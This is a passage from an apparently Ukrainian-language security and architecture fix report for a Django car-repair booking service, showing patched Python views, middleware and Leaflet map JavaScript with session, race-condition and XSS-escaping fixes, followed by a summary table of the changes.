    user_id = request.session.get('user_id')
    if not user_id:
        return None
    try:
        return User.objects.get(user_id=user_id)
    except User.DoesNotExist:
        request.session.flush()
        return None

def is_valid_vin(vin: str) -> bool:
    """Перевірка відповідності VIN-коду стандарту ISO 3779."""
    return bool(re.fullmatch(r'[A-HJ-NPR-Z0-9]{17}', vin.upper()))

def _validate_image_upload(uploaded_file):
    """Валідація завантаженого файлу зображення."""
    if not uploaded_file:
        return False, 'Оберіть файл для завантаження.'

    content_type = uploaded_file.content_type
    if content_type not in ALLOWED_IMAGE_TYPES:
        return False, 'Дозволені лише зображення (JPEG, PNG, WebP, GIF).'

    _, ext = os.path.splitext(uploaded_file.name.lower())
    if ext not in ALLOWED_IMAGE_TYPES[content_type]:
        return False, f'Розширення файлу "{ext}" не відповідає типу "{content_type}".'

    if uploaded_file.size > MAX_IMAGE_SIZE_BYTES:
        max_mb = MAX_IMAGE_SIZE_BYTES / (1024 * 1024)
        return False, f'Розмір файлу перевищує {max_mb:.0f} МБ.'

    return True, None

def _save_file(instance, field_name: str, uploaded_file):
    """Видаляє старий файл та зберігає новий."""
    old_file = getattr(instance, field_name)
    if old_file:
        try:
            if os.path.isfile(old_file.path):
                os.remove(old_file.path)
        except (ValueError, OSError):
            pass
    setattr(instance, field_name, uploaded_file)
    instance.save()

def _set_session_data(request, user):
    """Записує ідентифікаційні дані користувача в сесію."""
    # ✅ FIX (SEC-02): Ротація session ID для захисту від session fixation
    request.session.cycle_key()
    request.session['user_id'] = user.user_id
    request.session['user_name'] = user.full_name
    request.session['user_role'] = user.role

def _redirect_to_profile(**query_params):
    """Перенаправляє на профіль із передачею параметрів."""
    url = reverse('profile')
    if query_params:
        url += '?' + urlencode(query_params)
    return redirect(url)

def geocode_address(city: str, address: str):
    """Визначає геокоординати за адресою через Nominatim API."""
    query = f"{address}, {city}, Україна"
    try:
        resp = requests.get(
            'https://nominatim.openstreetmap.org/search',
            params={'q': query, 'format': 'json', 'limit': 1},
            headers={'User-Agent': 'Karro/1.0'},
            timeout=5,
        )
        data = resp.json()
        if data:
            return float(data[0]['lat']), float(data[0]['lon'])
    except Exception:
        logger.warning('Geocoding failed for address: %s', query, exc_info=True)
    return None, None


# ✅ FIX (ARCH-09): Валідація пароля через стандартні Django-валідатори
def _validate_password_strength(password, request, ctx=None):
    """
    Перевіряє пароль через AUTH_PASSWORD_VALIDATORS.
    Повертає True якщо пароль валідний, False та показує messages.error якщо ні.
    """
    try:
        validate_password(password)
        return True
    except ValidationError as e:
        for error in e.messages:
            messages.error(request, error)
        return False


def home(request):
    """Головна сторінка сервісу."""
    return render(request, 'main/home.html')


def login_view(request):
    """Авторизація користувача за email та паролем."""
    if request.session.get('user_id'):
        return redirect('profile')

    if request.method == 'POST':
        # ✅ FIX (SEC-01): Захист від brute-force
        ip = request.META.get('REMOTE_ADDR', '')
        if _check_login_rate_limit(ip):
            messages.error(
                request,
                'Забагато спроб входу. Спробуйте через 5 хвилин.'
            )
            return render(request, 'main/login.html')

        email = request.POST.get('email', '').strip().lower()
        password = request.POST.get('password', '')

        try:
            user = User.objects.get(email=email)
            # ✅ FIX (SEC-05): Перевірка is_active перед логіном
            if not user.is_active:
                messages.error(request, 'Ваш акаунт заблоковано.')
            elif check_password(password, user.password):
                _set_session_data(request, user)
                return redirect('profile')
            else:
                messages.error(request, 'Невірний email або пароль.')
        except User.DoesNotExist:
            messages.error(request, 'Невірний email або пароль.')

    return render(request, 'main/login.html')


def register_view(request):
    """Реєстрація нового користувача в системі."""
    if request.session.get('user_id'):
        return redirect('profile')

    if request.method == 'POST':
        full_name = request.POST.get('full_name', '').strip()
        phone = request.POST.get('phone', '').strip()
        email = request.POST.get('email', '').strip().lower()
        password = request.POST.get('password', '')
        password2 = request.POST.get('password2', '')
        role = request.POST.get('role', 'client')

        ctx = {'show_register': True}

        if not full_name:
            messages.error(request, "Введіть своє ім'я.")
            return render(request, 'main/login.html', ctx)

        if role not in ('client', 'station'):
            messages.error(request, 'Невірна роль.')
            return render(request, 'main/login.html', ctx)

        # ✅ FIX (ARCH-09): Використовуємо Django password validators
        if not _validate_password_strength(password, request):
            return render(request, 'main/login.html', ctx)

        if password != password2:
            messages.error(request, 'Паролі не збігаються.')
            return render(request, 'main/login.html', ctx)

        if User.objects.filter(email=email).exists():
            messages.error(request, 'Такий email вже зареєстровано.')
            return render(request, 'main/login.html', ctx)

        if User.objects.filter(phone=phone).exists():
            messages.error(request, 'Такий телефон вже використовується.')
            return render(request, 'main/login.html', ctx)

        user = User.objects.create(
            full_name=full_name,
            phone=phone,
            email=email,
            password=make_password(password),
            role=role,
        )

        _set_session_data(request, user)  # ✅ Вже містить cycle_key()
        messages.success(request, 'Реєстрація успішна! Ласкаво просимо.')
        return redirect('profile')

    return render(request, 'main/login.html', {'show_register': True})


@require_POST
def create_booking_api(request):
    """Створення заявки на ремонт (AJAX)."""
    user_id = request.session.get('user_id')
    if not user_id:
        return JsonResponse(
            {'status': 'error', 'message': 'Unauthorized'}, status=401
        )

    try:
        data = json.loads(request.body)
        station_id = data.get('station_id')
        car_id = data.get('car_id')
        service_name = data.get('service_name', '').strip()
        description = data.get('description', '').strip()
        scheduled_time = data.get('scheduled_time')

        if not station_id or not description or not service_name:
            return JsonResponse(
                {'status': 'error',
                 'message': 'Будь ласка, заповніть усі обов\'язкові поля'},
                status=400
            )

        if not scheduled_time:
            return JsonResponse(
                {'status': 'error',
                 'message': 'Бажаний час візиту обов\'язковий'},
                status=400
            )

        client = User.objects.get(user_id=user_id)

        # ✅ FIX (CRIT-05): Перевірка ролі — тільки клієнти можуть створювати заявки
        if client.role != 'client':
            return JsonResponse(
                {'status': 'error',
                 'message': 'Тільки клієнти можуть створювати заявки'},
                status=403
            )

        # ✅ FIX (SEC-05): Перевірка is_active
        if not client.is_active:
            return JsonResponse(
                {'status': 'error',
                 'message': 'Ваш акаунт заблоковано'},
                status=403
            )

        station = ServiceStation.objects.get(pk=station_id)

        # Перевірка чи автомобіль належить поточному клієнту
        if not car_id:
            return JsonResponse(
                {'status': 'error',
                 'message': 'Будь ласка, оберіть автомобіль'},
                status=400
            )
        try:
            car = Car.objects.get(vin_code=car_id, user=client)
        except Car.DoesNotExist:
            return JsonResponse(
                {'status': 'error',
                 'message': 'Обраний автомобіль не знайдено '
                            'або він не належить вам'},
                status=400
            )

        # Валідація формату дати/часу та годин роботи СТО
        try:
            import datetime
            scheduled_dt = datetime.datetime.fromisoformat(scheduled_time)
            if django_settings.USE_TZ and timezone.is_naive(scheduled_dt):
                scheduled_dt = timezone.make_aware(scheduled_dt)
        except ValueError:
            return JsonResponse(
                {'status': 'error', 'message': 'Невірний формат часу'},
                status=400
            )

        if scheduled_dt < timezone.now():
            return JsonResponse(
                {'status': 'error',
                 'message': 'Неможливо записатися на минулий час'},
                status=400
            )

        visit_time = scheduled_dt.time()
        if (visit_time < station.opening_time
                or visit_time > station.closing_time):
            opening_str = station.opening_time.strftime('%H:%M')
            closing_str = station.closing_time.strftime('%H:%M')
            return JsonResponse({
                'status': 'error',
                'message': f'СТО працює з {opening_str} до {closing_str}. '
                           f'Будь ласка, оберіть інший час.'
            }, status=400)

        booking = Booking.objects.create(
            client=client,
            station=station,
            car=car,
            service_name=service_name,
            description=description,
            scheduled_time=scheduled_dt
        )

        # Створення сповіщення для власника СТО
        Notification.objects.create(
            recipient=station.user,
            booking=booking,
            message=(
                f"Нова заявка #{booking.id}: {client.full_name} "
                f"на {scheduled_dt.strftime('%d.%m.%Y %H:%M')}"
            )
        )
        return JsonResponse(
            {"status": "success", "message": "Заявку успішно створено"}
        )
    except User.DoesNotExist:
        return JsonResponse(
            {'status': 'error', 'message': 'Клієнта не знайдено'},
            status=404
        )
    except ServiceStation.DoesNotExist:
        return JsonResponse(
            {'status': 'error', 'message': 'СТО не знайдено'},
            status=404
        )
    except json.JSONDecodeError:
        return JsonResponse(
            {'status': 'error', 'message': 'Невірний формат даних'},
            status=400
        )
    except Exception as e:
        logger.error('Booking API Error: %s', e, exc_info=True)
        return JsonResponse(
            {'status': 'error', 'message': 'Внутрішня помилка сервера'},
            status=500
        )

# ... profile_view, logout_view, client_profile_view та інші views
# залишаються без змін (окрім _set_session_data, яка вже виправлена вище)
```

---

### 8.3 `main/middleware.py` — Кешування перевірки бану (ARCH-05)

```python
import time
from django.shortcuts import redirect
from django.contrib import messages
from .models import User


class BanCheckMiddleware:
    """
    Перевірка активності авторизованого користувача.
    ✅ FIX (ARCH-05): Кешування результату перевірки у сесії з TTL
    для уникнення SQL-запиту на кожен HTTP-запит.
    """
    BAN_CHECK_TTL = 60  # Перевірка раз на хвилину

    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        user_id = request.session.get('user_id')
        if user_id:
            last_check = request.session.get('_ban_check_ts', 0)
            now = time.time()

            # Виконуємо запит до БД лише якщо минув TTL
            if now - last_check > self.BAN_CHECK_TTL:
                try:
                    user = User.objects.only('is_active').get(pk=user_id)
                    if not user.is_active:
                        request.session.flush()
                        messages.error(
                            request,
                            "Ваш аккаунт був заблокований адміністратором."
                        )
                        return redirect('login')
                    # Оновлюємо timestamp перевірки
                    request.session['_ban_check_ts'] = now
                except User.DoesNotExist:
                    request.session.flush()
                    return redirect('login')

        response = self.get_response(request)
        return response
```

---

### 8.4 `accounting/views.py` — Атомарні фінансові операції (CRIT-01, CRIT-02, CRIT-03, ARCH-02, ARCH-08)

> [!NOTE]
> Показані тільки змінені функції. `dashboard_view`, `add_employee_view`, `edit_employee_view`, `fire_employee_view`, `add_transaction_view` та інші залишаються без змін.

```python
from django.shortcuts import render, redirect, get_object_or_404
from django.contrib import messages
from django.views.decorators.http import require_POST
from django.urls import reverse
from django.http import HttpResponse
# ✅ FIX (CRIT-01/02/03): Імпорт transaction та F для атомарних операцій
from django.db import transaction
from django.db.models import F, Sum, Q, DecimalField
from django.db.models.functions import Coalesce
from main.decorators import login_required_session, role_required
from main.models import User, ServiceStation, Booking
from main.views import get_current_user
from .models import Employee, SalaryBalance, Transaction
import datetime
import re
from decimal import Decimal, InvalidOperation
import calendar
import csv
import json


def _redirect_to_dashboard(station_pk):
    """Перенаправлення на дашборд бухгалтерії."""
    return redirect(
        reverse('accounting:dashboard') + f'?station_id={station_pk}'
    )


# ✅ FIX (ARCH-08): Спільна utility-функція для парсингу діапазону дат
def _parse_date_range(request):
    """Парсить діапазон дат з GET-параметрів, дефолт — поточний місяць."""
    today = datetime.date.today()
    first_day = today.replace(day=1)
    _, last_day_num = calendar.monthrange(today.year, today.month)
    last_day = today.replace(day=last_day_num)

    start_date_str = request.GET.get('start_date')
    end_date_str = request.GET.get('end_date')

    start_date = first_day
    end_date = last_day

    if start_date_str:
        try:
            start_date = datetime.datetime.strptime(
                start_date_str, "%Y-%m-%d"
            ).date()
        except ValueError:
            pass
    if end_date_str:
        try:
            end_date = datetime.datetime.strptime(
                end_date_str, "%Y-%m-%d"
            ).date()
        except ValueError:
            pass

    return start_date, end_date


@login_required_session
@role_required('station')
@require_POST
def pay_salary_view(request):
    """
    ✅ FIX (CRIT-01): Виплата зарплати з атомарним блокуванням
    через select_for_update() та F() для запобігання race condition.
    """
    user = get_current_user(request)
    employee_id = request.POST.get('employee_id')
    employee = get_object_or_404(Employee, pk=employee_id, station__user=user)

    amount_str = request.POST.get('amount', '0.00')
    try:
        amount = Decimal(amount_str)
    except (ValueError, InvalidOperation):
        messages.error(request, "Некоректна сума виплати.")
        return _redirect_to_dashboard(employee.station.pk)

    if amount <= 0:
        messages.error(request, "Сума виплати має бути більшою за нуль.")
        return _redirect_to_dashboard(employee.station.pk)

    try:
        with transaction.atomic():
            # ✅ SELECT ... FOR UPDATE — блокує рядок від конкурентних змін
            balance = SalaryBalance.objects.select_for_update().get(
                employee=employee
            )
            if amount > balance.current_balance:
                messages.error(
                    request,
                    f"Сума виплати ({amount} грн) перевищує "
                    f"доступний баланс ({balance.current_balance} грн)."
                )
                return _redirect_to_dashboard(employee.station.pk)

            # ✅ F() — атомарне оновлення у БД без race condition
            balance.total_paid = F('total_paid') + amount
            balance.save(update_fields=['total_paid'])

            Transaction.objects.create(
                station=employee.station,
                type='expense',
                category='salary',
                amount=amount,
                description=(
                    f"Виплата зарплати працівнику: "
                    f"{employee.full_name} ({employee.position})"
                ),
                employee=employee,
                date=datetime.date.today()
            )

        messages.success(
            request,
            f"Виплата {amount} грн працівнику {employee.full_name} "
            f"успішно проведена."
        )
    except Exception as e:
        messages.error(request, f"Помилка при виплаті зарплати: {e}")

    return _redirect_to_dashboard(employee.station.pk)


@login_required_session
@role_required('station')
@require_POST
def complete_booking_view(request):
    """
    ✅ FIX (CRIT-02, CRIT-03): Завершення ремонту з атомарним блокуванням.
    select_for_update() для booking та salary_balance.
    """
    user = get_current_user(request)
    booking_id = request.POST.get('booking_id')

    actual_price_str = request.POST.get('actual_price')
    employee_id = request.POST.get('employee_id')

    if not actual_price_str:
        messages.error(
            request,
            "Будь ласка, вкажіть фактичну вартість ремонту."
        )
        return redirect('profile')

    try:
        actual_price = Decimal(actual_price_str)
    except (ValueError, InvalidOperation):
        messages.error(request, "Некоректна сума вартості ремонту.")
        return redirect('profile')

    if actual_price <= 0:
        messages.error(
            request,
            "Вартість ремонту повинна бути більшою за нуль."
        )
        return redirect('profile')

    try:
        with transaction.atomic():
            # ✅ FIX (CRIT-02): Блокуємо рядок booking від паралельних змін
            booking = Booking.objects.select_for_update().get(
                pk=booking_id, station__user=user
            )

            # Перевірка поточного статусу
            if booking.status == 'completed':
                messages.warning(
                    request,
                    f"Заявка #{booking.pk} вже була завершена раніше."
                )
                return redirect(reverse('profile') + '?tab=bookings')

            if booking.status == 'cancelled':
                messages.error(
                    request,
                    f"Неможливо завершити скасовану заявку #{booking.pk}."
                )
                return redirect(reverse('profile') + '?tab=bookings')

            employee = None
            if employee_id:
                employee = get_object_or_404(
                    Employee, pk=employee_id, station=booking.station
                )

            # 1. Позначаємо ремонт як виконаний
            booking.status = 'completed'
            booking.save(update_fields=['status'])

            # 2. Записуємо вартість робіт у доходи СТО
            desc = (
                f"Завершено ремонт за заявкою #{booking.id} "
                f"({booking.service_name or 'Загальні роботи'})"
            )
            if employee:
                desc += f". Виконавець: {employee.full_name}."

            tx = Transaction.objects.create(
                station=booking.station,
                type='income',
                category='service',
                amount=actual_price,
                description=desc,
                booking=booking,
                employee=employee,
                date=datetime.date.today()
            )

            # 3. Нараховуємо майстру комісію
            if employee and employee.commission_percent > 0:
                commission = actual_price * (
                    employee.commission_percent / Decimal('100.00')
                )
                commission = commission.quantize(Decimal('0.01'))

                # ✅ FIX (CRIT-03): Атомарне оновлення балансу
                sb = SalaryBalance.objects.select_for_update().get(
                    employee=employee
                )
                sb.total_earned = F('total_earned') + commission
                sb.save(update_fields=['total_earned'])

                tx.description += f" Нараховано комісію: {commission} грн."
                tx.save(update_fields=['description'])

        messages.success(
            request,
            f"Ремонт за заявкою #{booking.id} успішно завершено. "
            f"Суму {actual_price} грн внесено в дохід СТО."
        )
    except Booking.DoesNotExist:
        messages.error(request, "Заявку не знайдено.")
    except Exception as e:
        messages.error(request, f"Помилка при завершенні ремонту: {e}")

    return redirect(reverse('profile') + '?tab=bookings')


@login_required_session
@role_required('station')
def export_transactions_csv(request):
    """
    ✅ FIX (SEC-06, ARCH-08): Експорт CSV з санітизацією імені файлу
    та використанням спільної _parse_date_range.
    """
    user = get_current_user(request)
    if not user:
        return redirect('login')

    station_id = request.GET.get('station_id')
    if not station_id:
        messages.error(request, "Не вказано СТО для експорту.")
        return redirect('profile')

    station = get_object_or_404(ServiceStation, pk=int(station_id), user=user)

    # ✅ FIX (ARCH-08): Використовуємо спільну utility
    start_date, end_date = _parse_date_range(request)

    t_type = request.GET.get('type')
    category = request.GET.get('category')
    employee_id_filter = request.GET.get('employee_id')

    transactions = Transaction.objects.filter(
        station=station, date__range=[start_date, end_date]
    ).select_related('employee', 'booking')

    if t_type and t_type in ['income', 'expense']:
        transactions = transactions.filter(type=t_type)
    if category and category != 'all':
        transactions = transactions.filter(category=category)
    if employee_id_filter and employee_id_filter != 'all':
        try:
            transactions = transactions.filter(
                employee_id=int(employee_id_filter)
            )
        except ValueError:
            pass

    # ✅ FIX (SEC-06): Санітизація імені файлу
    safe_name = re.sub(r'[^\w\s-]', '', station.name).strip()[:50]
    response = HttpResponse(content_type='text/csv; charset=utf-8-sig')
    response['Content-Disposition'] = (
        f'attachment; filename="{safe_name}_report_'
        f'{start_date}_{end_date}.csv"'
    )

    writer = csv.writer(response)
    writer.writerow([
        'Дата', 'Тип операції', 'Категорія', 'Сума (грн)',
        'Опис', 'ID Заявки', 'Співробітник'
    ])

    for t in transactions:
        writer.writerow([
            t.date.strftime("%d.%m.%Y"),
            t.get_type_display(),
            t.get_category_display(),
            t.amount,
            t.description or '',
            t.booking.id if t.booking else '',
            t.employee.full_name if t.employee else ''
        ])

    return response
```

---

### 8.5 `static/js/search.js` — Виправлення XSS (SEC-04)

```javascript
let map;
let markers = {};

// ✅ FIX (SEC-04): Функція екранування HTML для захисту від XSS
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

function initMap() {
    map = L.map('map', { zoomControl: true }).setView([49.0, 31.5], 6);

    L.tileLayer(
        'https://{s}.basemaps.cartocdn.com/rastertiles/voyager/{z}/{x}/{y}.png',
        {
            maxZoom: 19,
            attribution:
                '&copy; <a href="https://www.openstreetmap.org/copyright">' +
                'OpenStreetMap</a> contributors ' +
                '&copy; <a href="https://carto.com/attributions">CARTO</a>'
        }
    ).addTo(map);

    if (!STATIONS.length) return;

    const bounds = [];

    const pinIcon = L.divIcon({
        html: `
            <svg viewBox="0 0 24 24" width="32" height="32" fill="none"
                 style="filter: drop-shadow(0 4px 8px rgba(0,82,204,0.25));">
                <path d="M12 2C8.13 2 5 5.13 5 9C5 14.25 12 22 12 22S19 14.25 19 9C19 5.13 15.87 2 12 2Z"
                      fill="#0052CC" stroke="#ffffff" stroke-width="1.5"/>
                <circle cx="12" cy="9" r="3" fill="#ffffff"/>
            </svg>
        `,
        className: 'custom-pin-marker',
        iconSize: [32, 32],
        iconAnchor: [16, 32],
        popupAnchor: [0, -32]
    });

    STATIONS.forEach(s => {
        const marker = L.marker([s.lat, s.lng], { icon: pinIcon }).addTo(map);

        // ✅ FIX (SEC-04): Екранування всіх user-controlled даних
        const escapedName = escapeHtml(s.name);
        const escapedCity = s.city ? escapeHtml(s.city) + ', ' : '';
        const escapedAddress = escapeHtml(s.address);

        marker.bindPopup(`
            <div style="font-family: 'Inter', sans-serif; min-width: 180px;
                        padding: 4px;">
                <div style="font-weight: 700; font-size: 0.95rem;
                            margin-bottom: 4px; color: var(--text);">
                    ${escapedName}
                </div>
                <div style="font-size: 0.75rem; color: var(--text-muted);
                            line-height: 1.3;">
                    ${escapedCity}${escapedAddress}
                </div>
                ${s.rating
                    ? `<div style="margin-top: 8px; color: var(--accent);
                                  font-weight: 700; font-size: 0.85rem;
                                  display: flex; align-items: center;
                                  gap: 2px;">
                           ★ ${escapeHtml(String(s.rating))}
                       </div>`
                    : ''}
            </div>
        `);

        marker.on('click', () => {
            highlightCard(s.id);
        });

        markers[s.id] = marker;
        bounds.push([s.lat, s.lng]);
    });

    if (bounds.length === 1) {
        map.setView(bounds[0], 14);
    } else {
        map.fitBounds(bounds, { padding: [40, 40] });
    }
}

function focusMarker(id, lat, lng) {
    document.querySelectorAll('.station-card').forEach(
        c => c.classList.remove('active')
    );
    const card = document.getElementById('card-' + id);
    if (card) card.classList.add('active');

    if (lat !== null && lng !== null && markers[id]) {
        map.setView([parseFloat(lat), parseFloat(lng)], 15);
        markers[id].openPopup();
    }
}

function highlightCard(id) {
    document.querySelectorAll('.station-card').forEach(
        c => c.classList.remove('active')
    );
    const card = document.getElementById('card-' + id);
    if (card) {
        card.classList.add('active');
        card.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    }
}

document.addEventListener('DOMContentLoaded', () => {
    initMap();
    setTimeout(() => {
        if (map) {
            map.invalidateSize();
        }
    }, 250);
});
```

---

### 8.6 `static/js/station_detail.js` — Виправлення XSS у Leaflet popup (SEC-04)

Фрагмент з виправленням (лише секція mini map):

```javascript
    /* ── Mini map ── */
    const mapContainer = document.getElementById('station-map');
    if (mapContainer && mapContainer.dataset.lat && mapContainer.dataset.lng) {
        const lat = parseFloat(mapContainer.dataset.lat);
        const lng = parseFloat(mapContainer.dataset.lng);
        const name = mapContainer.dataset.name;
        const address = mapContainer.dataset.address;

        // ✅ FIX (SEC-04): Функція екранування
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        const map = L.map('station-map', {
            zoomControl: false,
            scrollWheelZoom: false
        }).setView([lat, lng], 15);

        L.tileLayer(
            'https://{s}.basemaps.cartocdn.com/rastertiles/voyager/' +
            '{z}/{x}/{y}.png',
            {
                maxZoom: 19,
                attribution:
                    '&copy; <a href="https://www.openstreetmap.org/' +
                    'copyright">OpenStreetMap</a> contributors ' +
                    '&copy; <a href="https://carto.com/attributions">' +
                    'CARTO</a>'
            }
        ).addTo(map);

        const pinIcon = L.divIcon({
            html: `
                <svg viewBox="0 0 24 24" width="32" height="32"
                     fill="none"
                     style="filter: drop-shadow(0 4px 8px
                            rgba(0,82,204,0.25));">
                    <path d="M12 2C8.13 2 5 5.13 5 9C5 14.25 12 22
                             12 22S19 14.25 19 9C19 5.13 15.87 2
                             12 2Z"
                          fill="#0052CC" stroke="#ffffff"
                          stroke-width="1.5"/>
                    <circle cx="12" cy="9" r="3" fill="#ffffff"/>
                </svg>
            `,
            className: 'custom-pin-marker',
            iconSize: [32, 32],
            iconAnchor: [16, 32],
            popupAnchor: [0, -32]
        });

        // ✅ FIX (SEC-04): Екрановані user-controlled дані
        L.marker([lat, lng], { icon: pinIcon }).addTo(map).bindPopup(`
            <div style="font-family: 'Inter', sans-serif; padding: 4px;">
                <div style="font-weight: 700; font-size: 0.9rem;
                            color: var(--text);">
                    ${escapeHtml(name)}
                </div>
                <div style="font-size: 0.75rem; color: var(--text-muted);">
                    ${escapeHtml(address)}
                </div>
            </div>
        `).openPopup();

        setTimeout(() => {
            map.invalidateSize();
        }, 250);
    }
```

---

### 8.7 Зведення всіх змін

| Файл | Тип зміни | Пов'язані проблеми |
|------|-----------|-------------------|
| [settings.py](file:///e:/sto/sto/settings.py) | `CSRF_COOKIE_HTTPONLY = False` | CRIT-04 |
| [main/views.py](file:///e:/sto/main/views.py) | Session fixation fix, rate limiter, role check, password validators | SEC-01, SEC-02, SEC-05, CRIT-05, ARCH-09 |
| [main/middleware.py](file:///e:/sto/main/middleware.py) | Кешування ban check з TTL | ARCH-05 |
| [accounting/views.py](file:///e:/sto/accounting/views.py) | `transaction.atomic()`, `select_for_update()`, `F()`, DRY date parsing, CSV sanitization | CRIT-01, CRIT-02, CRIT-03, SEC-06, ARCH-08 |
| [search.js](file:///e:/sto/static/js/search.js) | `escapeHtml()` у Leaflet popups | SEC-04 |
| [station_detail.js](file:///e:/sto/static/js/station_detail.js) | `escapeHtml()` у Leaflet popup | SEC-04 |
